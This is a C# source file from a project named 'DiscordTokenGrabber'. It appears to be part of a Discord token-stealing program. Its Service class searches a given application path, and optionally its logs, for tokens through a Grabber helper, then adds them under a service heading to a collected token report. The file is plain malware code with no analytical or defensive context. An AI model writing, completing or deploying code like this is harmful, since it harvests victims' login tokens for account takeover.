using System.Collections.Generic;

namespace DiscordTokenGrabber;

public class Service
{
	private readonly string _serviceName;

	private readonly string _servicePath;

	private readonly bool _searchLogs;

	public Service(string name, string path, bool logs = false)
	{
		_serviceName = name;
		_servicePath = path;
		_searchLogs = logs;
	}

	public void GetTokens()
	{
		List<string> tokens = Grabber.GetTokens(_servicePath, _searchLogs);
		if (tokens.Count > 0)
		{
			tokens.Insert(0, "\n**" + _serviceName + "**");
			Program.TokenReport.AddRange(tokens);
		}
	}
}
